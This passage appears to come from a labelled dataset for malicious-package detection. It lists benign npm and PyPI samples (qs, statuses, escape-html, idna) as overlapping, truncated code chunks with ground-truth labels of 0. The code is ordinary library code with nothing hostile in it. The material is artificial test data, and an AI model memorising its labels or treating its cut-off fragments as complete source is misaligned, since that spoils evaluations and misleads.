data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nvar interpretNumericEntities = function (str) {\n    return str.replace(/&#(\\d+);/g, function ($0, numberStr) {\n        return String.fromCharCode(parseInt(numberStr, 10));\n    });\n};\n\nvar parseArrayValue = function (val, options, currentArrayLength) {\n    if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n        return val.split(',');\n    }\n\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nvar parseArrayValue = function (val, options, currentArrayLength) {\n    if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n        return val.split(',');\n    }\n\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n\n    return val;\n};\n\n// This is what browsers will submit w\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nvar parseObject = function (chain, val, options, valuesParsed) {\n    var currentArrayLength = 0;\n    if (chain.length > 0 && chain[chain.length - 1] === '[]') {\n        var parentKey = chain.slice(0, -1).join('');\n        currentArrayLength = Array.isArray(val) && val[parentKey] ? val[parentKey].length : 0;\n    }\n\n    var leaf = valuesParsed ? val : parseArrayValue(val, options, currentArrayLength);\n\n    for (var i = chain.length - 1; i >= 0; --i) {\n        var obj;\n        var root = chain[i];\n\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction compactQueue(queue) {\n    while (queue.length > 1) {\n        var item = queue.pop();\n        var obj = item.obj[item.prop];\n\n        if (isArray(obj)) {\n            var compacted = [];\n\n            for (var j = 0; j < obj.length; ++j) {\n                if (typeof obj[j] !== 'undefined') {\n                    compacted.push(obj[j]);\n                }\n            }\n\n            item.obj[item.prop] = compacted;\n        }\n    }\n};\n\nvar arrayToObject = function arrayToObject(source, options)\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction arrayToObject(source, options) {\n    var obj = options && options.plainObjects ? { __proto__: null } : {};\n    for (var i = 0; i < source.length; ++i) {\n        if (typeof source[i] !== 'undefined') {\n            obj[i] = source[i];\n        }\n    }\n\n    return obj;\n};\n\nvar merge = function merge(target, source, options) {\n    /* eslint no-param-reassign: 0 */\n    if (!source) {\n        return target;\n    }\n\n    if (typeof source !== 'object' && typeof source !== 'function') {\n        if\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction merge(target, source, options) {\n    /* eslint no-param-reassign: 0 */\n    if (!source) {\n        return target;\n    }\n\n    if (typeof source !== 'object' && typeof source !== 'function') {\n        if (isArray(target)) {\n            target.push(source);\n        } else if (target && typeof target === 'object') {\n            if (\n                (options && (options.plainObjects || options.allowPrototypes))\n                || !has.call(Object.prototype, source)\n            ) {\n           \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction assignSingleSource(target, source) {\n    return Object.keys(source).reduce(function (acc, key) {\n        acc[key] = source[key];\n        return acc;\n    }, target);\n};\n\nvar decode = function (str, defaultDecoder, charset) {\n    var strWithoutPlus = str.replace(/\\+/g, ' ');\n    if (charset === 'iso-8859-1') {\n        // unescape never throws, no try...catch needed:\n        return strWithoutPlus.replace(/%[0-9a-f]{2}/gi, unescape);\n    }\n    // utf-8\n    try {\n        return decodeURIComp\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction encode(str, defaultEncoder, charset, kind, format) {\n    // This code was originally written by Brian White (mscdex) for the io.js core querystring library.\n    // It has been adapted here for stricter adherence to RFC 3986\n    if (str.length === 0) {\n        return str;\n    }\n\n    var string = str;\n    if (typeof str === 'symbol') {\n        string = Symbol.prototype.toString.call(str);\n    } else if (typeof str !== 'string') {\n        string = String(str);\n    }\n\n    if (charset === 'i\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction compact(value) {\n    var queue = [{ obj: { o: value }, prop: 'o' }];\n    var refs = [];\n\n    for (var i = 0; i < queue.length; ++i) {\n        var item = queue[i];\n        var obj = item.obj[item.prop];\n\n        var keys = Object.keys(obj);\n        for (var j = 0; j < keys.length; ++j) {\n            var key = keys[j];\n            var val = obj[key];\n            if (typeof val === 'object' && val !== null && refs.indexOf(val) === -1) {\n                queue.push({ obj: obj, prop: key });\n\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction isRegExp(obj) {\n    return Object.prototype.toString.call(obj) === '[object RegExp]';\n};\n\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') {\n        return false;\n    }\n\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n\nvar combine = function combine(a, b) {\n    return [].concat(a, b);\n};\n\nvar maybeMap = function maybeMap(val, fn) {\n    if (isArray(val)) {\n        var mapped = [];\n        for (var i = 0; i < \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') {\n        return false;\n    }\n\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n\nvar combine = function combine(a, b) {\n    return [].concat(a, b);\n};\n\nvar maybeMap = function maybeMap(val, fn) {\n    if (isArray(val)) {\n        var mapped = [];\n        for (var i = 0; i < val.length; i += 1) {\n            mapped.push(fn(val[i]));\n        }\n        return mapped;\n    }\n    return fn(va\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction combine(a, b) {\n    return [].concat(a, b);\n};\n\nvar maybeMap = function maybeMap(val, fn) {\n    if (isArray(val)) {\n        var mapped = [];\n        for (var i = 0; i < val.length; i += 1) {\n            mapped.push(fn(val[i]));\n        }\n        return mapped;\n    }\n    return fn(val);\n};\n\nmodule.exports = {\n    arrayToObject: arrayToObject,\n    assign: assign,\n    combine: combine,\n    compact: compact,\n    decode: decode,\n    encode: encode,\n    isBuffer: isBuffer,\n    isRegExp: isReg\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js (function)\nfunction maybeMap(val, fn) {\n    if (isArray(val)) {\n        var mapped = [];\n        for (var i = 0; i < val.length; i += 1) {\n            mapped.push(fn(val[i]));\n        }\n        return mapped;\n    }\n    return fn(val);\n};\n\nmodule.exports = {\n    arrayToObject: arrayToObject,\n    assign: assign,\n    combine: combine,\n    compact: compact,\n    decode: decode,\n    encode: encode,\n    isBuffer: isBuffer,\n    isRegExp: isRegExp,\n    maybeMap: maybeMap,\n    merge: merge\n};\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/empty-keys-cases.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/index.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js": "serializeDate: function (d) { return d.getTime(); },\n                    arrayFormat: 'comma',\n                    commaRoundTrip: true\n                }\n            ),\n            'a%5B%5D=' + date.getTime(),\n            'works with arrayFormat comma'\n        );\n\n        st.end();\n    });\n\n    t.test('RFC 1738 serialization', function (st) {\n        st.equal(qs.stringify({ a: 'b c' }, { format: qs.formats.RFC1738 }), 'a=b+c');\n        st.equal(qs.stringify({ 'a b': 'c d' }, { format: qs.formats",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js": "decoder: function (str, defaultDecoder, charset) {\n                return str ? defaultDecoder(str, defaultDecoder, charset) : null;\n            },\n            interpretNumericEntities: true\n        }), { foo: null, bar: '\u263a' });\n        st.end();\n    });\n\n    t.test('does not interpret numeric entities in iso-8859-1 when `interpretNumericEntities` is absent', function (st) {\n        st.deepEqual(qs.parse('foo=' + urlEncodedNumSmiley, { charset: 'iso-8859-1' }), { foo: '&#9786;' });\n        st.en",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js": "toString: function () { return '(abc)'; } }),\n        '%28abc%29',\n        'toStrings and encodes parentheses'\n    );\n\n    t.equal(\n        utils.encode('abc 123 \ud83d\udca9', null, 'iso-8859-1'),\n        'abc%20123%20%26%2355357%3B%26%2356489%3B',\n        'encodes in iso-8859-1'\n    );\n\n    var longString = '';\n    var expectedString = '';\n    for (var i = 0; i < 1500; i++) {\n        longString += ' ';\n        expectedString += '%20';\n    }\n\n    t.equal(\n        utils.encode(longString),\n        expected",
        "data/benign_samples/npm/popular/qs/6.14.0/package/test/empty-keys-cases.js": "'use strict';\n\nmodule.exports = {\n    emptyTestCases: [\n        {\n            input: '&',\n            withEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '',\n                indices: '',\n                repeat: ''\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&&',\n            withEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '',\n                indices: '',\n                repeat: ''\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&=',\n            withEmptyKeys: { '': ['', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=',\n                indices: '[0]=&[1]=',\n                repeat: '=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&=&',\n            withEmptyKeys: { '': ['', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=',\n                indices: '[0]=&[1]=',\n                repeat: '=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=',\n            withEmptyKeys: { '': '' },\n            noEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            }\n        },\n        {\n            input: '=&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&&&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&=&=&',\n            withEmptyKeys: { '': ['', '', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=&[]=',\n                indices: '[0]=&[1]=&[2]=',\n                repeat: '=&=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&a[]=b&a[1]=c',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: '=a',\n            withEmptyKeys: { '': 'a' },\n            noEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '=a',\n                indices: '=a',\n                repeat: '=a'\n            }\n        },\n        {\n            input: 'a==a',\n            withEmptyKeys: { a: '=a' },\n            noEmptyKeys: { a: '=a' },\n            stringifyOutput: {\n                brackets: 'a==a',\n                indices: 'a==a',\n                repeat: 'a==a'\n            }\n        },\n        {\n            input: '=&a[]=b',\n            withEmptyKeys: { '': '', a: ['b'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b',\n                indices: '=&a[0]=b',\n                repeat: '=&a=b'\n            },\n            noEmptyKeys: { a: ['b'] }\n        },\n        {\n            input: '=&a[]=b&a[]=c&a[2]=d',\n            withEmptyKeys: { '': '', a: ['b', 'c', 'd'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c&a[]=d',\n                indices: '=&a[0]=b&a[1]=c&a[2]=d',\n                repeat: '=&a=b&a=c&a=d'\n            },\n            noEmptyKeys: { a: ['b', 'c', 'd'] }\n        },\n        {\n            input: '=a&=b',\n            withEmptyKeys: { '': ['a', 'b'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b',\n                indices: '[0]=a&[1]=b',\n                repeat: '=a&=b'\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=a&foo=b',\n            withEmptyKeys: { '': 'a', foo: 'b' },\n            noEmptyKeys: { foo: 'b' },\n            stringifyOutput: {\n                brackets: '=a&foo=b',\n                indices: '=a&foo=b',\n                repeat: '=a&foo=b'\n            }\n        },\n        {\n            input: 'a[]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a[]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a[0]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a=b&a[]=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a=b&a[0]=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: '[]=a&[]=b& []=1',\n            withEmptyKeys: { '': ['a', 'b'], ' ': ['1'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b& []=1',\n                indices: '[0]=a&[1]=b& [0]=1',\n                repeat: '=a&=b& =1'\n            },\n            noEmptyKeys: { 0: 'a', 1: 'b', ' ': ['1'] }\n        },\n        {\n            input: '[0]=a&[1]=b&a[0]=1&a[1]=2',\n            withEmptyKeys: { '': ['a', 'b'], a: ['1', '2'] },\n            noEmptyKeys: { 0: 'a', 1: 'b', a: ['1', '2'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b&a[]=1&a[]=2',\n                indices: '[0]=a&[1]=b&a[0]=1&a[1]=2',\n                repeat: '=a&=b&a=1&a=2'\n            }\n        },\n        {\n            input: '[deep]=a&[deep]=2',\n            withEmptyKeys: { '': { deep: ['a', '2'] }\n            },\n            stringifyOutput: {\n                brackets: '[deep][]=a&[deep][]=2',\n                indices: '[deep][0]=a&[deep][1]=2',\n                repeat: '[deep]=a&[deep]=2'\n            },\n            noEmptyKeys: { deep: ['a', '2'] }\n        },\n        {\n            input: '%5B0%5D=a&%5B1%5D=b',\n            withEmptyKeys: { '': ['a', 'b'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b',\n                indices: '[0]=a&[1]=b',\n                repeat: '=a&=b'\n            },\n            noEmptyKeys: { 0: 'a', 1: 'b' }\n        }\n    ]\n};\n",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js": "var pushToArray = function (arr, valueOrArray) {\n    push.apply(arr, isArray(valueOrArray) ? valueOrArray : [valueOrArray]);\n};\n\nvar toISO = Date.prototype.toISOString;\n\nvar defaultFormat = formats['default'];\nvar defaults = {\n    addQueryPrefix: false,\n    allowDots: false,\n    allowEmptyArrays: false,\n    arrayFormat: 'indices',\n    charset: 'utf-8',\n    charsetSentinel: false,\n    commaRoundTrip: false,\n    delimiter: '&',\n    encode: true,\n    encodeDotInKeys: false,\n    encoder: utils.encod",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/index.js": "'use strict';\n\nvar stringify = require('./stringify');\nvar parse = require('./parse');\nvar formats = require('./formats');\n\nmodule.exports = {\n    formats: formats,\n    parse: parse,\n    stringify: stringify\n};\n",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js": "var parseObject = function (chain, val, options, valuesParsed) {\n    var currentArrayLength = 0;\n    if (chain.length > 0 && chain[chain.length - 1] === '[]') {\n        var parentKey = chain.slice(0, -1).join('');\n        currentArrayLength = Array.isArray(val) && val[parentKey] ? val[parentKey].length : 0;\n    }\n\n    var leaf = valuesParsed ? val : parseArrayValue(val, options, currentArrayLength);\n\n    for (var i = chain.length - 1; i >= 0; --i) {\n        var obj;\n        var root = chain[i];\n",
        "data/benign_samples/npm/popular/qs/6.14.0/package/lib/utils.js": "function maybeMap(val, fn) {\n    if (isArray(val)) {\n        var mapped = [];\n        for (var i = 0; i < val.length; i += 1) {\n            mapped.push(fn(val[i]));\n        }\n        return mapped;\n    }\n    return fn(val);\n};\n\nmodule.exports = {\n    arrayToObject: arrayToObject,\n    assign: assign,\n    combine: combine,\n    compact: compact,\n    decode: decode,\n    encode: encode,\n    isBuffer: isBuffer,\n    isRegExp: isRegExp,\n    maybeMap: maybeMap,\n    merge: merge\n};\n"
      },
      "package_size_bytes": 38756,
      "num_files": 50,
      "metadata": {
        "package_hash": "npm_qs_6.14.0",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "statuses",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction createMessageToStatusCodeMap (codes) {\n  var map = {}\n\n  Object.keys(codes).forEach(function forEachCode (code) {\n    var message = codes[code]\n    var status = Number(code)\n\n    // populate map\n    map[message.toLowerCase()] = status\n  })\n\n  return map\n}\n\n/**\n * Create a list of all status codes.\n * @private\n */\n\nfunction createStatusCodeList (codes) {\n  return Object.keys(codes).map(function mapCode (code) {\n    return Number(code)\n  })\n}\n\n/**\n * Get the status code for given message.\n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction forEachCode (code) {\n    var message = codes[code]\n    var status = Number(code)\n\n    // populate map\n    map[message.toLowerCase()] = status\n  })\n\n  return map\n}\n\n/**\n * Create a list of all status codes.\n * @private\n */\n\nfunction createStatusCodeList (codes) {\n  return Object.keys(codes).map(function mapCode (code) {\n    return Number(code)\n  })\n}\n\n/**\n * Get the status code for given message.\n * @private\n */\n\nfunction getStatusCode (message) {\n  var msg = message.toLowerCase()\n\n  if \n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction createStatusCodeList (codes) {\n  return Object.keys(codes).map(function mapCode (code) {\n    return Number(code)\n  })\n}\n\n/**\n * Get the status code for given message.\n * @private\n */\n\nfunction getStatusCode (message) {\n  var msg = message.toLowerCase()\n\n  if (!Object.prototype.hasOwnProperty.call(status.code, msg)) {\n    throw new Error('invalid status message: \"' + message + '\"')\n  }\n\n  return status.code[msg]\n}\n\n/**\n * Get the status message for given code.\n * @private\n */\n\nfunction g\n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction mapCode (code) {\n    return Number(code)\n  })\n}\n\n/**\n * Get the status code for given message.\n * @private\n */\n\nfunction getStatusCode (message) {\n  var msg = message.toLowerCase()\n\n  if (!Object.prototype.hasOwnProperty.call(status.code, msg)) {\n    throw new Error('invalid status message: \"' + message + '\"')\n  }\n\n  return status.code[msg]\n}\n\n/**\n * Get the status message for given code.\n * @private\n */\n\nfunction getStatusMessage (code) {\n  if (!Object.prototype.hasOwnProperty.call(sta\n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction getStatusCode (message) {\n  var msg = message.toLowerCase()\n\n  if (!Object.prototype.hasOwnProperty.call(status.code, msg)) {\n    throw new Error('invalid status message: \"' + message + '\"')\n  }\n\n  return status.code[msg]\n}\n\n/**\n * Get the status message for given code.\n * @private\n */\n\nfunction getStatusMessage (code) {\n  if (!Object.prototype.hasOwnProperty.call(status.message, code)) {\n    throw new Error('invalid status code: ' + code)\n  }\n\n  return status.message[code]\n}\n\n/**\n * Ge\n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction getStatusMessage (code) {\n  if (!Object.prototype.hasOwnProperty.call(status.message, code)) {\n    throw new Error('invalid status code: ' + code)\n  }\n\n  return status.message[code]\n}\n\n/**\n * Get the status code.\n *\n * Given a number, this will throw if it is not a known status\n * code, otherwise the code will be returned. Given a string,\n * the string will be parsed for a number and return the code\n * if valid, otherwise will lookup the code assuming this is\n * the status message.\n *\n \n==================================================\n\n# File: data/benign_samples/npm/popular/statuses/2.0.2/package/index.js (function)\nfunction status (code) {\n  if (typeof code === 'number') {\n    return getStatusMessage(code)\n  }\n\n  if (typeof code !== 'string') {\n    throw new TypeError('code must be a number or string')\n  }\n\n  // '403'\n  var n = parseInt(code, 10)\n  if (!isNaN(n)) {\n    return getStatusMessage(n)\n  }\n\n  return getStatusCode(code)\n}\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js",
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/statuses/2.0.2/package/index.js": "function status (code) {\n  if (typeof code === 'number') {\n    return getStatusMessage(code)\n  }\n\n  if (typeof code !== 'string') {\n    throw new TypeError('code must be a number or string')\n  }\n\n  // '403'\n  var n = parseInt(code, 10)\n  if (!isNaN(n)) {\n    return getStatusMessage(n)\n  }\n\n  return getStatusCode(code)\n}\n"
      },
      "package_size_bytes": 4274,
      "num_files": 7,
      "metadata": {
        "package_hash": "npm_statuses_2.0.2",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "escape-html",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/escape-html/1.0.3/package/index.js (function)\nfunction escapeHtml(string) {\n  var str = '' + string;\n  var match = matchHtmlRegExp.exec(str);\n\n  if (!match) {\n    return str;\n  }\n\n  var escape;\n  var html = '';\n  var index = 0;\n  var lastIndex = 0;\n\n  for (index = match.index; index < str.length; index++) {\n    switch (str.charCodeAt(index)) {\n      case 34: // \"\n        escape = '&quot;';\n        break;\n      case 38: // &\n        escape = '&amp;';\n        break;\n      case 39: // '\n        escape = '&#39;';\n        break;\n      case 60: /\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/escape-html/1.0.3/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/escape-html/1.0.3/package/index.js": "function escapeHtml(string) {\n  var str = '' + string;\n  var match = matchHtmlRegExp.exec(str);\n\n  if (!match) {\n    return str;\n  }\n\n  var escape;\n  var html = '';\n  var index = 0;\n  var lastIndex = 0;\n\n  for (index = match.index; index < str.length; index++) {\n    switch (str.charCodeAt(index)) {\n      case 34: // \"\n        escape = '&quot;';\n        break;\n      case 38: // &\n        escape = '&amp;';\n        break;\n      case 39: // '\n        escape = '&#39;';\n        break;\n      case 60: /"
      },
      "package_size_bytes": 639,
      "num_files": 1,
      "metadata": {
        "package_hash": "npm_escape-html_1.0.3",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "idna",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (class)\nclass IDNATests(unittest.TestCase):\n    def setUp(self):\n        self.tld_strings = [\n            [\"\\u6d4b\\u8bd5\", b\"xn--0zwm56d\"],\n            [\"\\u092a\\u0930\\u0940\\u0915\\u094d\\u0937\\u093e\", b\"xn--11b5bs3a9aj6g\"],\n            [\"\\ud55c\\uad6d\", b\"xn--3e0b707e\"],\n            [\"\\u09ad\\u09be\\u09b0\\u09a4\", b\"xn--45brj9c\"],\n            [\"\\u09ac\\u09be\\u0982\\u09b2\\u09be\", b\"xn--54b7fta0cc\"],\n            [\n                \"\\u0438\\u0441\\u043f\\u044b\\u0442\\u0430\\u043d\\u0438\\u0435\",\n                b\"xn--80akhbyknj4f\",\n            ],\n            [\"\\u0441\\u0440\\u0431\", b\"xn--90a3ac\"],\n            [\"\\ud14c\\uc2a4\\ud2b8\", b\"xn--9t4b11yi5a\"],\n            [\n                \"\\u0b9a\\u0bbf\\u0b99\\u0bcd\\u0b95\\u0baa\\u0bcd\\u0baa\\u0bc2\\u0bb0\\u0bcd\",\n                b\"xn--clchc0ea0b2g2a9gcd\",\n            ],\n            [\"\\u05d8\\u05e2\\u05e1\\u05d8\", b\"xn--deba0ad\"],\n            [\"\\u4e2d\\u56fd\", b\"xn--fiqs8s\"],\n            [\"\\u4e2d\\u570b\", b\"xn--fiqz9s\"],\n            [\"\\u0c2d\\u0c3e\\u0c30\\u0c24\\u0c4d\", b\"xn--fpcrj9c3d\"],\n            [\"\\u0dbd\\u0d82\\u0d9a\\u0dcf\", b\"xn--fzc2c9e2c\"],\n            [\"\\u6e2c\\u8a66\", b\"xn--g6w251d\"],\n            [\"\\u0aad\\u0abe\\u0ab0\\u0aa4\", b\"xn--gecrj9c\"],\n            [\"\\u092d\\u093e\\u0930\\u0924\", b\"xn--h2brj9c\"],\n            [\"\\u0622\\u0632\\u0645\\u0627\\u06cc\\u0634\\u06cc\", b\"xn--hgbk6aj7f53bba\"],\n            